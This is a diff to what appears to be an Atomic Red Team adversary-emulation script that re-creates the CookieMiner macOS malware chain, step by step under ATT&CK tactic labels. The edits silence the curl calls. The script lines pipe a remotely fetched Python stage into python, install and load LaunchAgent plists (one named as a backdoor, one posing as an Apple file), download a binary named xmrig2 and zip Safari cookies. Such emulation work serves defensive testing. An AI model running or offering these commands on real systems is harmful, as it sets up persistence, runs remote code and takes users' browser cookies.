@@ -23,7 +23,7 @@ zip -r interestingsafaricookies.zip ${OUTPUT}
 #   Simulate network connection for exfiltration
 curl https://atomicredteam.io
 
-curl https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py || wget -q -O- https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py | python - ``
+curl -s https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py || wget -q -O- https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-stage-02.py | python - ``
 
 #   Tactic: Discovery
 #   Technique: T1083 - File and Directory Discovery
@@ -33,14 +33,14 @@ cp interestingfiles.txt ${OUTPUT}/interestingfiles.txt
 #   Tactic: Persistence
 #   Technique: T1159 - Launch Agent
 cd ~/Library/LaunchAgents
-curl -o com.apple.rig2.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
-curl -o com.proxy.initialize.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-backdoor-launchagent.plist
+curl -s -o com.apple.rig2.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
+curl -s -o com.proxy.initialize.plist https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/cookie-miner-backdoor-launchagent.plist
 launchctl load -w com.apple.rig2.plist
 launchctl load -w com.proxy.initialize.plist
 
 
 cd /Users/Shared
-curl -o xmrig2 https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/atomic-hello
+curl -s -o xmrig2 https://raw.githubusercontent.com/ForensicITGuy/atomic-red-team/cookieMiner/ARTifacts/Chain_Reactions/atomic-hello.macos
 
 #   Tactic: Defense Evasion
 #   Technique: T1222 - File Permissions Modification
